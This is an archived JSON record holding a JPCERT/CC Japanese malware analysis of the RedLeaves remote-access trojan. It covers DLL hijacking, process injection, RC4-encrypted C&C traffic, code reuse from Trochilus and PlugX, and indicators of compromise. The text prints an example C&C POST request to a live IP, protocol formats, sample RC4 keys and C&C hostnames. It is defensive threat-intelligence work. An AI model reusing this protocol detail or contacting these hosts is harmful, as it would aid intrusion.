{
    "id": "ca90fe26-0036-457e-aed8-0414aca99078",
    "created_at": "2023-01-12T15:02:00.519698Z",
    "updated_at": "2025-03-27T02:17:02.259176Z",
    "deleted_at": null,
    "sha1_hash": "38f93caeb84e1482c7e6663644543c15c663ea3d",
    "title": "2017-04-03 - オープンソースのRATを改良したマルウエアRedLeaves",
    "authors": "",
    "file_creation_date": "2022-05-28T23:44:03Z",
    "file_modification_date": "2022-05-28T23:44:03Z",
    "file_size": 3716612,
    "plain_text": "# オープンソースのRATを改良したマルウエア RedLeaves(2017-04-03)\n\n**jpcert.or.jp/magazine/acreport-redleaves.html**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n2017/04/03\n\n[RedLeaves](https://blogs.jpcert.or.jp/ja/tags/redleaves/)\n\n[メール](http://10.10.0.46/mailto:?subject=%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AERAT%E3%82%92%E6%94%B9%E8%89%AF%E3%81%97%E3%81%9F%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2RedLeaves%282017-04-03%29&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2017%2F04%2Fredleaves.html)\n\nオープンソースのRATを改良したマルウエアRedLeaves\n\n\n-----\n\nJPCERT/CCでは2016年10月頃から、RedLeavesと呼ばれるマルウエアに感染したことによ\nる情報漏えいなどの被害事例を複数確認しています。RedLeavesは2016年以降、新たに確\n認されるようになったマルウエアで、標的型攻撃メールで送信されています。\n今回は、RedLeavesの詳細や分析の結果判明したRedLeavesとPlugXとの関連性、\nRedLeavesが作成されるベースとなったツールについて紹介します。\n\n**RedLeavesが動作するまでの流れ**\nRedLeavesが動作するまでの流れを、図1に示しています。\n\n図 1：RedLeavesが動作するまでの\n\n流れ\nJPCERT/CCで確認している検体は、実行されると以下の3つのファイルを%TEMP%フォル\nダに作成し、正規アプリケーションを実行します。\n\n正規アプリケーション（EXEファイル）: 同じフォルダに存在するDLLファイルを読み\n込む署名された実行ファイル\nローダー（DLLファイル）: 正規ファイルにより読み込まれる不正なDLLファイル\nエンコードされたRedLeaves（DATAファイル）: ローダーに読み込まれるエンコード\nされたデータ\n\n実行された正規アプリケーションは、DLL Hijacking（DLLプリローディング）によって同じ\nフォルダ内に存在するローダーをロードします。DLL Hijackingについて詳しくは[1]を参照\nしてください。\n\n正規アプリケーションにロードされたローダーは、エンコードされたRedLeavesを読み込\nみ、デコードし、実行します。実行されたRedLeavesは設定内容に応じてプロセス\n（Internet Explorer）を起動し、自身をインジェクションします。その後、RedLeavesはイ\nンジェクションされたプロセスの中で動作するようになります。以降では、インジェクショ\nンされたRedLeavesの詳細な挙動を解説します。\n\n\n-----\n\n**RedLeavesの挙動の詳細**\nRedLeavesは、特定のサイトとHTTPまたは独自プロトコルで通信を行い、受信した命令を\n実行するマルウエアです。図2はインジェクションされたRedLeavesのPEヘッダ部分で\nす。”MZ”や”PE”などの文字列が”0xFF 0xFF”で削除されています。\n\n図 2： インジェクションされた\n\nRedLeaves\nインジェクションされたRedLeavesは、HTTP POSTリクエストまたは独自プロトコルで\nC&Cサーバに接続します。通信先や通信方式については、設定情報に含まれています。設定\n情報の詳細に関しては、Appendix Aをご覧ください。\n\n以下は、HTTP POSTリクエストの例です。送信するデータのフォーマットについては、\nAppendix B表B-1、表B-2をご覧ください。\n\nPOST /YJCk8Di/index.php\n\nConnection: Keep-Alive\n\nAccept: */*\n\nContent-Length: 140\n\nHost: 67.205.132.17:443\n\n[データ]\n\nデータはRC4で暗号化（キーは設定情報に含まれている）されており、以下のような内容が\n含まれています。\n```\n__msgid=23.__serial=0.clientid=A58D72524B51AA4DBBB70431BD3DBBE9\n\n```\nC&Cサーバから受信するデータには、コマンドなどが含まれており、受信したコマンドに応\nじて、以下の機能を実行します。（受信するデータについてはAppendix B表B-3をご覧くだ\nさい）\n\nファイル関連の操作\n任意のシェルコマンド実行\n通信方式の設定\nドライブ情報の送信\n\n\n-----\n\nシステム情報の送信\nファイルアップロード・ダウンロード\nスクリーンキャプチャ\nプロキシ機能の実行\n\n**RedLeavesのベースとなったコード**\n以上のような機能を持つRedLeavesですが、分析した結果Github上で公開されている\nTrochilus[2]と呼ばれるRAT（Remote Administration Tool）のソースコードと類似する部分\nが多数あることを確認しました。図3は、送受信するデータを処理するコードの一部です。\nAppendix B表B-3で記載した内容と同じデータを処理していることが分かります。\n\n図 3： Trochilusのソースコードの一\n\n部\nRedLeavesは、一から作成されたわけではなくTrochilusのソースコードを改良して作成され\nたと考えられます。\n\n**PlugXとの関連性**\n\nJPCERT/CCで確認しているRedLeavesと、過去に特定の攻撃グループが使用していた\nPlugXを比較すると、一部の処理に類似のコード使われていることが分かりました。以下\nは、本体が3つのファイル（正規アプリケーション、ローダー、エンコードされた\nRedLeavesまたはPlugX）を作成する際の処理です。\n\n\n-----\n\n図 4： ファイル作成処理の比較\n\nさらに、ローダーがエンコードされたデータ（エンコードされたRedLeavesまたはPlugX）\nをデコードする処理も類似しています。\n\n図 5： ファイルデコード処理の比較\n\nまた、上記の類似のコードを持つRedLeavesとPlugXの検体の中には同じ通信先を使用する\nものが存在することを確認しています。このことから、RedLeavesを使用している攻撃グル\nープは、RedLeavesを使用する以前はPlugXを使って攻撃を行っていたと考えられます。\n\n\n-----\n\nおわりに\nRedLeavesは、2016年から確認されるようになった新しいマルウエアです。現在も標的型\n攻撃メールとして送信されており、今後もRedLeavesを悪用した攻撃は続く可能性があるた\nめ、注意が必要です。\n今回解説した検体のハッシュ値に関しては、Appendix Cに記載しています。また、これま\nでJPCERT/CCで確認しているRedLeavesの通信先の一部はAppendix Dに記載していますの\nで、このような通信先にアクセスしている端末がないかご確認ください。\n\n分析センター 朝長 秀誠\n\n参考情報\n\n[1] JPCERT/CC分析センターだより: 巧妙化するDLL hijacking ～ CVE2011-1991を悪用する\n攻撃 ～(2013-01-31)\n[https://blogs.jpcert.or.jp/ja/2013/01/vol1.html](https://blogs.jpcert.or.jp/ja/2013/01/vol1.html)\n\n[2] Trochilus: A fast&free windows remote administration Tool\n[https://github.com/5loyd/trochilus](https://github.com/5loyd/trochilus)\n\n**Appendix A 設定情報**\n\n表 A: 設定情報の一覧\n\nオフセット 説明 備考\n\n0x000 通信先1\n\n0x040 通信先2\n\n0x080 通信先3\n\n0x0C0 ポート番号\n\n0x1D0 通信モード 1=TCP, 2=HTTP, 3=HTTPS, 4=TCP and HTTP\n\n0x1E4 ID\n\n0x500 Mutex\n\n0x726 インジェクションプロセス\n\n0x82A RC4キー 通信の暗号化に使用\n\nRC4キーの例\n\nLucky123\nproblems\n\n\n-----\n\n20161213\njohn1234\nminasawa\n\n**Appendix B 送受信データの内容**\n\n表 B-1: HTTP POSTリクエストで送信されるデータフォーマット\n\nオフセット 長さ 内容\n\n0x00 4 RC4暗号化されたデータ長 （RC4キーの先頭の4バイトでXOR）\n\n0x04 4 Server id （RC4キーの先頭の4バイトでXOR）\n\n0x08 4 固定値\n\n0x0C - RC4暗号化されたデータ\n\n表 B-2: 独自プロトコルで送信されるデータフォーマット\n\nオフセット 長さ 内容\n\n0x00 4 ランダムな数値\n\n0x04 4 固定値\n\n0x08 4 長さ\n\n0x0C 4 RC4暗号化されたデータ長 （RC4キーの先頭の4バイトでXOR）\n\n0x10 4 Server id （RC4キーの先頭の4バイトでXOR）\n\n0x14 4 固定値\n\n0x18 - RC4暗号化されたデータ\n\n表 B-3: 受信データに含まれる内容\n\n文字列 種類 内容\n\n__msgid 数値 コマンド\n\n__serial 数値\n\n__upt true など コマンドをスレッド実行するか\n\n\n-----\n\n__data データ コマンドパラメータなど\n\n**Appendix C 検体のSHA-256ハッシュ値**\n\nRedLeaves\n・5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481\n\nPlugX\n・fcccc611730474775ff1cfd4c60481deef586f01191348b07d7a143d174a07b0\n\n**Appendix D 通信先一覧**\n\n・mailowl.jkub.com\n・windowsupdates.itemdb.com\n・microsoftstores.itemdb.com\n・67.205.132.17\n・144.168.45.116\n\n[メール](http://10.10.0.46/mailto:?subject=%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AERAT%E3%82%92%E6%94%B9%E8%89%AF%E3%81%97%E3%81%9F%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2RedLeaves%282017-04-03%29&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2017%2F04%2Fredleaves.html)\n\nこの記事の筆者\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n外資系ITベンダーでのセキュリティ監視・分析業務を経て、2012年12月から現職。現在\nは、マルウェア分析・フォレンジック調査に従事。主に、標的型攻撃に関するインシデント\n分析を行っている。CODE BLUE、BsidesLV、BlackHat USA Arsenal、Botconf、PacSec、\nFIRSTなどで講演。JSACオーガナイザー。\n\nこのページは役に立ちましたか？\n\n0人が「このページが役に立った」と言っています。\n\nその他、ご意見・ご感想などございましたら、ご記入ください。\n\nこちらはご意見・ご感想用のフォームです。各社製品については、各社へお問い合わせくだ\nさい。\n\n\n-----\n\njavascriptを有効にすると、ご回答いただけます。 ありがとうございました。\n\n## 関連記事\n\nHUI Loaderの分析\n\nAnti-UPX Unpackingテクニック\n\nモバイル端末を狙うマルウェアへの対応FAQ\n\n攻撃グループLuoYuが使用するマルウェアWinDealer\n\n\n-----\n\n攻撃グループBlackTechが使用するマルウェアGh0stTimes\n\n≪ [前へ](https://blogs.jpcert.or.jp/ja/2017/03/impfuzzy_neo4.html)\n[トップに戻る](https://www.jpcert.or.jp/ja/)\n[次へ](https://blogs.jpcert.or.jp/ja/2017/05/redleaves2.html) ≫\n\n## ライター\n\n\n関\n口\n\n\n恵田\n\n\n汰洞\n\n\n河\n野 一\n之\n\n\n-----\n\n岩\n崎 照\n\n\n寺\n本 健\n\n\n-----",
    "language": "JA",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-04-03 - オープンソースのRATを改良したマルウエアRedLeaves.pdf"
    ],
    "report_names": [
        "2017-04-03 - オープンソースのRATを改良したマルウエアRedLeaves.pdf"
    ],
    "threat_actors": [
        {
            "id": "2646f776-792a-4498-967b-ec0d3498fdf1",
            "created_at": "2022-10-25T15:50:23.475784Z",
            "updated_at": "2025-03-27T02:00:55.479958Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Palmerworm"
            ],
            "source_name": "MITRE:BlackTech",
            "tools": [
                "Kivars",
                "PsExec",
                "TSCookie",
                "Flagpro",
                "Waterbear"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d3a7123c-f519-49a0-a234-de24a1ef052a",
            "created_at": "2022-10-25T16:47:55.545211Z",
            "updated_at": "2025-03-27T02:05:17.254744Z",
            "deleted_at": null,
            "main_name": "BRONZE CANAL",
            "aliases": [
                "CTG-6177 ",
                "Circuit Panda ",
                "Palmerworm ",
                "Shrouded Crossbow ",
                "BlackTech"
            ],
            "source_name": "Secureworks:BRONZE CANAL",
            "tools": [
                " DRIGO",
                " Flagpro",
                " Gh0stTimes",
                " PLEAD",
                " Spiderpig",
                " Waterbear",
                "Bifrose"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75024aad-424b-449a-b286-352fe9226bcb",
            "created_at": "2023-01-06T13:46:38.962724Z",
            "updated_at": "2025-03-27T02:00:02.964002Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "CIRCUIT PANDA",
                "Temp.Overboard",
                "G0098",
                "Red Djinn",
                "HUAPI",
                "Palmerworm",
                "T-APT-03",
                "Manga Taurus",
                "Earth Hundun"
            ],
            "source_name": "MISPGALAXY:BlackTech",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "efa7c047-b61c-4598-96d5-e00d01dec96b",
            "created_at": "2022-10-25T16:07:23.404442Z",
            "updated_at": "2025-03-27T02:02:09.781478Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Circuit Panda",
                "Earth Hundun",
                "Manga Taurus",
                "Operation PLEAD",
                "Operation Shrouded Crossbow",
                "Operation Waterbear",
                "Palmerworm",
                "Radio Panda",
                "Red Djinn",
                "T-APT-03",
                "TEMP.Overboard"
            ],
            "source_name": "ETDA:BlackTech",
            "tools": [
                "BIFROST",
                "BUSYICE",
                "BendyBear",
                "Bluether",
                "CAPGELD",
                "DRIGO",
                "Deuterbear",
                "Flagpro",
                "GOODTIMES",
                "Gh0stTimes",
                "IconDown",
                "KIVARS",
                "LOLBAS",
                "LOLBins",
                "Linopid",
                "Living off the Land",
                "TSCookie",
                "Waterbear",
                "XBOW",
                "elf.bifrose"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535720,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1653781443,
    "ts_modification_date": 1653781443,
    "files": {
        "pdf": "https://archive.orkl.eu/38f93caeb84e1482c7e6663644543c15c663ea3d.pdf",
        "text": "https://archive.orkl.eu/38f93caeb84e1482c7e6663644543c15c663ea3d.txt",
        "img": "https://archive.orkl.eu/38f93caeb84e1482c7e6663644543c15c663ea3d.jpg"
    }
}